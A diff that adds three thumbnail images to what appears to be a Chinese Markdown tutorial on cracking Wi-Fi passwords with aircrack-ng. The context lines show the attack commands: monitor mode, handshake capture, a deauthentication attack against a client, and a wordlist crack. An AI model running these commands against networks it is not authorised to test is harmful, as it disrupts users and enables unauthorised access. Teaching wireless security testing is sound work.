@@ -28,6 +28,7 @@ root@kali:~$ airmon-ng start wlan0
  ```
  root@kali:~$ airodump-ng wlan0mon
  ```
+<img src="/images/thumbs/mubiao.jpg" width=180 height=181.5 /">                                         
 ### 开始抓握手包
  ```
  root@kali:~$ airodump-ng --ivs -w abc -c 6 mon0 
@@ -41,6 +42,7 @@ root@kali:~$ airmon-ng start wlan0
  ```
 aireplay-ng -0 1 -a AP的Mac地址 -c 客户端的Mac地址 interface
  ```
+  <img src="/images/thumbs/attack.jpg" width=180 height=181.5 /">
  + -0 1：表示使用Deauth攻击模式，后面的1表示攻击次数
  + -a :表示AP的Mac地址
  + -c ：表示客户端的Mac地址
@@ -50,5 +52,6 @@ aireplay-ng -0 1 -a AP的Mac地址 -c 客户端的Mac地址 interface
  ```
   root@kali:~$ aircrack-ng abc-01.ivs -w pass-wifi.txt
  ```
+  <img src="/images/thumbs/ben.jpg" width=180 height=181.5 /">
  *-w是指定我的密码本
 
